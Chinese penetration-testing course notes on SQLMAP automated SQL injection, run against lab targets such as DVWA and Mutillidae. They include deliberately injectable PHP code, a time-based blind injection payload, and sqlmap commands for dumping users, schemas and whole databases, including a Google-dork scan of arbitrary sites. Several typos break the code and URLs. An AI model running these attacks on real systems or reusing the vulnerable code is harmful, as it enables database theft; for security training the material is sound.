@@ -1,0 +1,252 @@
+课时92 SQLMAP- 自动注入
+
+SQLMAP自动注入
+开源sql注入漏洞检测、利用工具
+检测动态页面中get/post参数、cookie、http头
+数据榨取
+文件系统访问
+操作系统命令执行
+引擎强大、特性丰富
+Xss漏洞检测
+
+------------------------------------------------------------------------------
+低安全代码
+<?php
+
+if (isset($_GET['Submit'])){
+
+    // Retrieve data
+
+    $id = $_GET['id'];
+
+    $getid = "SELECT first_name,last_name FROM users WHERE user_id ='$id';
+    $result = mysql_query($getid);
+
+    $num = @mysql_numrows($result);
+
+    $i = 0;
+
+    while ($i < $num){
+
+        $first = mysql_result($result,$i,"first_name");
+        $last = mysql_result($result,$i,"last_name");
+
+        echo '<pre>';
+        echo 'ID: ' . $id . '<br>first_name: ' . $first . '<br>Surname: ' . $last;
+        echi '</pre>';
+
+        $i++;
+    }
+}
+?>
+------------------------------------------------------------------------------
+中安全代码
+<?php
+
+if (isset($_GET['Submit'])){
+
+    // Retrieve data
+
+    $id = $_GET['id'];
+    $id = mysql_real_escape_string($id);
+
+    $getid = "SELECT first_name,last_name FROM users WHERE user_id ='$id';
+    $result = mysql_query($getid);    // Removed or die' to suppres mysql errors
+
+    $num = @mysql_numrows($result);   // The '@' character supressed errors making the injection bling
+
+    $i = 0;
+
+    while ($i < $num){
+
+        $first = mysql_result($result,$i,"first_name");
+        $last = mysql_result($result,$i,"last_name");
+
+        echo '<pre>';
+        echo 'ID: ' . $id . '<br>first_name: ' . $first . '<br>Surname: ' . $last;
+        echi '</pre>';
+
+        $i++;
+    }
+}
+?>
+
+-------------------------------------------------------------------------
+高安全代码
+<?php
+
+if (isset($_GET['Submit'])){
+
+    // Retrieve data
+
+    $id = $_GET['id'];
+    $id = stripslashed($id);
+    $id = mysql_real_escape_string($id);
+
+    $getid = "SELECT first_name,last_name FROM users WHERE user_id ='$id';
+    $result = mysql_query($getid);    // Removed or die' to suppres mysql errors
+
+    $num = @mysql_numrows($result);   // The '@' character supressed errors making the injection bling
+
+    $i = 0;
+
+    while ($i < $num){
+
+        $first = mysql_result($result,$i,"first_name");
+        $last = mysql_result($result,$i,"last_name");
+
+        echo '<pre>';
+        echo 'ID: ' . $id . '<br>first_name: ' . $first . '<br>Surname: ' . $last;
+        echi '</pre>';
+
+        $i++;
+    }
+}
+?>
+------------------------------------------------------------------------
+
+SQLMAP自动注入
+五种漏洞检测技术
+    基于布尔的盲注检测
+    基于时间的盲注检测
+        'and (select * from (select(sleep(20)))a)--+
+    基于错误的检测
+    基于UNION联合查询的检测
+        适用于通过循坏直接输出联合查询结果，否则只显示第一项结果
+    基于堆叠查询的检测
+        ;堆叠多个查询语句
+        适用于非select的数据修改、删除的操作
+支持的数据库管理系统DBMS
+    MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,IBM DB2,SQLite,
+    Firebird,Sybase,SAP MaxDB
+
+SQLMAP自动注入
+其他特性
+    数据库直接连接-d
+        不通过SQL注入，制定身份证信息、IP、端口
+    与burpustie、google结合适用，支持政策表达式限定测试目标
+    Get、post、cookie、Referer、User-Agent（随机或指定）
+        Cookie过期后自动处理Set-Cookie头，更新cookie信息
+    限速：最大并发、延迟发送
+    支持Basic,Digest,NTLM,CA身份认证
+    数据库版本、用户、权限、hash枚举和字典破解、暴力破解表列名称
+    文件上传下载、UDF、启动并执行存储过程、操作系统命令执行、访问windows注册表
+    与w3af、metasploit集成结合适用，基于数据库服务进程提权和上传执行后门
+
+SQLMAP自动注入
+基于python2.7开发
+安装
+    apt-get install git
+    git clone https://gihub.com/sqlmapproject/sqlmap.git sqlmap-dev
+升级
+    sqlmap --update 在线
+    git pull        离线
+Kali集成板随kali库更新
+
+root@R:~# sqlmap --update
+
+root@R:~# sqlmap --version      //查看sqlmap版本
+
+root@R:~# git clone https://gihub.com/sqlmapproject/sqlmap.git sqlmap-dev
+
+SQLMAP自动注入
+sqlmap -h / -hh
+sqlmap -d "mysql://root:@192.168.20.10:3306/dvwa" -f -users 
+--banner --dbs --schema -a
+sqlmap --version -v
+日志
+    sqlmap
+输出
+    输出内容详细度分7个等级
+
+root@R:~# sqlmap -h
+
+root@R:~# sqlmap -hh   //所有的参数
+
+SQLMAP自动注入
+    Get方法
+        sqlmap -u "http://192.168.20.10/muilldae/index.php?page=user-
+        info.php&username=11&password=22&user-info-php-submit-
+        button=View+Account+Details" -p username -f
+    扫描URL列表文件
+        http://1.1.1.1/vuln.php?q=foobar
+        http://1.1.1.1/vuln3/id/1*
+        sqlmap -m list.txt
+    扫描google搜索结果
+        sqlmap.py -g "inurl:\".php?id=1\""
+
+root@R:~# sqlmap -u "http://192.168.20.10/muilldae/index.php?page=user-info.php&username=11&password=22&user-info-php-submit-button=View+Account+Details" -p username
+文件保存到/root/.sqlmap/output
+
+root@R:~# cd .sqlmap/
+
+root@R:~/.sqlmap# ls
+output
+
+root@R:~/.sqlmap# cd output/
+
+root@R:~/.sqlmap/output# ls
+192.168.1.121
+
+root@R:~/.sqlmap/output# cd 192.168.1.121
+
+root@R:~/.sqlmap/output/192.168.1.121# ls
+log  session.sqlite  target.txt
+
+root@R:~/.sqlmap/output/192.168.1.121# more log
+
+root@R:~/.sqlmap/output/192.168.1.121# more session.sqlite
+
+root@R:~/.sqlmap/output/192.168.1.121# more  target.txt
+
+root@R:~# sqlmap -u "http://192.168.20.10/muilldae/index.php?page=user-info.php&username=11&password=22&user-info-php-submit-button=View+Account+Details" -p username --users
+
+root@R:~# sqlmap -u "http://192.168.20.10/muilldae/index.php?page=user-info.php&username=11&password=22&user-info-php-submit-button=View+Account+Details" -p username --banner
+
+root@R:~# sqlmap -u "http://192.168.20.10/muilldae/index.php?page=user-info.php&username=11&password=22&user-info-php-submit-button=View+Account+Details" -p username --schema
+
+root@R:~# sqlmap -u "http://192.168.20.10/muilldae/index.php?page=user-info.php&username=11&password=22&user-info-php-submit-button=View+Account+Details" -p username --schema -a     //所有
+
+root@R:~# sqlmap -d "mysql://root@192.168.1.121:3306/dvwa" -f -users
+
+root@R:~# sqlmap -d "mysql://root@192.168.1.121:3306/dvwa" -f -banner
+
+root@R:~# sqlmap -d "mysql://root@192.168.1.121:3306/dvwa" -f -a
+
+root@R:~# vi list
+http://192.168.20.10/muilldae/index.php?page=user-info.php&username=11&password=22&user-info-php-submit-button=View+Account+Details
+
+root@R:~# sqlmap -m list.txt --dbs
+
+root@R:~# sqlmap -m list.txt --user
+
+SQLMAP自动注入
+POST方法
+    使用http请求文件（burpsuite）
+        sqlmap -r request.txt
+    使用burpsuite log文件
+        sqlmap -l log.txt
+HTTPS
+    sqlmap -u "http://1.1.1.1/a.php?id=1:8843" --force-ssl
+扫描配置文件
+    sqlmap -c sqlmap.conf
+
+root@R:~# vi post
+User-Agent: Mozilla/5.0 (x11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Icweasel/43.0.4
+Accept: text/htm,appliction/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accep-Encoding: gzip, deflate
+Referer: http://192.168.1.121/murillidae/index.php?page=login.php
+Cookie: PHPSESSID=558206c48166fc5523a87b591100fb3e
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 52
+useranme=1&password=11&login-php-submin-button=login
+
+root@R:~# sqlmap -r post.txt --dbs
+
+root@R:~# dpkg -L sqlmap | grep sqlmap.com
+/etc/sqlmap/sqlmap.conf
+/usr/share/doc/sqlmap/examples/sqlmap.conf.gz
+
+root@R:~# cat /etc/sqlmap/sqlmap.conf
